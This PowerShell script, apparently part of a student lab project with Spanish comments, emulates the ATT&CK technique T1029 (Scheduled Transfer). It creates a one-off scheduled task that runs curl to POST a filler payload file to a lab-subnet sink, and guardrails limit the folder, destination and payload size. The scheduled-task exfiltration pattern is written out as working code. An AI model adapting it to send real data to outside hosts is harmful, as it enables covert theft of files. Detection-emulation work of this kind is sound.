# ATA079 - T1029 Scheduled Transfer (Windows)
# Manual: el clon ART 388942ad no trae T1029. Se implementa schtasks + POST local.
# Requiere que angel tenga sesion iniciada (snapshot GUI/autologon); la tarea usa /it.
# La creacion de la tarea es el evento de proceso esperado (4698/106 es ciego).
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA079*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$sink = '192.168.65.1'
$port = 9090
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
$payload = Join-Path $dir 'payload.txt'
1..20 | ForEach-Object { "TFG schtasks $_ " + ('F' * 64) } | Set-Content -Path $payload -Encoding ascii
if ((Get-Item $payload).Length -gt 67108864) { Write-Error 'GUARDARRAIL: payload > 64 MiB'; exit 2 }
$post = Join-Path $dir 'post.cmd'
$postBody = @"
@echo off
"C:\Windows\System32\curl.exe" -s -S -X POST --data-binary "@$payload" http://${sink}:${port}/upload/ATA079
"@
Set-Content -Path $post -Value $postBody -Encoding ascii
$task = 'TFG-ATA079'
$st = (Get-Date).AddMinutes(1).ToString('HH:mm')
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
& schtasks.exe /create /tn $task /tr "cmd.exe /c $post" /sc once /st $st /f /it | Out-Null
$last = ''
for ($i = 0; $i -lt 45; $i++) {
    Start-Sleep -Seconds 2
    $q = & schtasks.exe /query /tn $task /fo LIST /v 2>&1 | Out-String
    if ($q -match 'Last Run Time:\s*(.+)') { $last = $Matches[1].Trim() }
    if ($last -and $last -notmatch 'N/A|Not Yet') { break }
}
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
& schtasks.exe /delete /tn $task /f | Out-Null
@(
    "ata=ATA079", "tecnica=T1029", "fuente=manual",
    "t0=$t0", "t1=$t1", "task=$task", "trigger=$st",
    "last_run=$last", "post=$post", "payload=$payload"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
